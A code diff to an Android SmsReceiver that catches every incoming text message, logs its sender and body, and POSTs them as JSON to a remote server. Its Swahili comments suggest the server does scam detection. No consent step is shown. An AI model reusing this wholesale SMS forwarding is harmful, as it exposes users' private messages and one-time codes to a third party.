@@ -6,6 +6,7 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
+import org.json.JSONObject;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -32,8 +33,8 @@ public class SmsReceiver extends BroadcastReceiver {
                     Log.d(TAG, "📨 SMS From: " + sender);
                     Log.d(TAG, "💬 SMS Body: " + messageBody);
 
-                    // CHUKUA SMS ZOTE - HAITAFUTI PATTERNS
-                    Log.d(TAG, "✅ TAKING ALL SMS - SENDING TO SERVER");
+                    // TUMBA SMS ZOTE BILA KUBAGUA - SERVER NDIYO ITAKAYE DETECT
+                    Log.d(TAG, "✅ SENDING ALL SMS TO SERVER FOR PROCESSING");
                     sendToServer(sender, messageBody);
                 }
             }
@@ -44,35 +45,41 @@ public class SmsReceiver extends BroadcastReceiver {
         new Thread(new Runnable() {
             @Override
             public void run() {
+                HttpURLConnection conn = null;
                 try {
                     URL url = new URL(SERVER_URL);
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Content-Type", "application/json");
+                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                     conn.setRequestProperty("Accept", "application/json");
+                    conn.setConnectTimeout(30000); // 30 seconds
+                    conn.setReadTimeout(30000); // 30 seconds
                     conn.setDoOutput(true);
 
-                    // Tuma data yote ya SMS
-                    String jsonData = "{" +
-                            "\"sms_content\": \"" + messageBody.replace("\"", "\\\"").replace("\n", " ") + "\"," +
-                            "\"sender_number\": \"" + sender + "\"," +
-                            "\"timestamp\": \"" + System.currentTimeMillis() + "\"" +
-                            "}";
+                    // Create JSON data
+                    JSONObject jsonData = new JSONObject();
+                    jsonData.put("sms_content", messageBody);
+                    jsonData.put("sender_number", sender);
+                    jsonData.put("timestamp", System.currentTimeMillis());
 
-                    Log.d(TAG, "📤 Sending to server: " + SERVER_URL);
-                    Log.d(TAG, "📊 Data: " + jsonData);
+                    String jsonString = jsonData.toString();
 
+                    Log.d(TAG, "🌐 Sending to server: " + SERVER_URL);
+                    Log.d(TAG, "📤 Data length: " + messageBody.length() + " characters");
+
+                    // Write data
                     OutputStream os = conn.getOutputStream();
-                    os.write(jsonData.getBytes());
+                    os.write(jsonString.getBytes("UTF-8"));
                     os.flush();
                     os.close();
 
                     int responseCode = conn.getResponseCode();
-                    Log.d(TAG, "✅ Server Response Code: " + responseCode);
+                    Log.d(TAG, "📥 Server Response Code: " + responseCode);
 
                     // Read response
                     BufferedReader br = new BufferedReader(new InputStreamReader(
-                            responseCode == 200 ? conn.getInputStream() : conn.getErrorStream()
+                            responseCode == 200 ? conn.getInputStream() : conn.getErrorStream(),
+                            "UTF-8"
                     ));
                     String responseLine;
                     StringBuilder response = new StringBuilder();
@@ -81,12 +88,21 @@ public class SmsReceiver extends BroadcastReceiver {
                     }
                     br.close();
 
-                    Log.d(TAG, "📥 Server Response: " + response.toString());
+                    Log.d(TAG, "📨 Server Response: " + response.toString());
 
-                    conn.disconnect();
+                    if (responseCode == 200) {
+                        Log.d(TAG, "✅ SMS successfully sent to server");
+                    } else {
+                        Log.e(TAG, "❌ Server returned error: " + responseCode);
+                    }
 
                 } catch (Exception e) {
-                    Log.e(TAG, "❌ ERROR: " + e.getMessage());
+                    Log.e(TAG, "🚨 ERROR sending to server: " + e.getMessage());
+                    e.printStackTrace();
+                } finally {
+                    if (conn != null) {
+                        conn.disconnect();
+                    }
                 }
             }
         }).start();
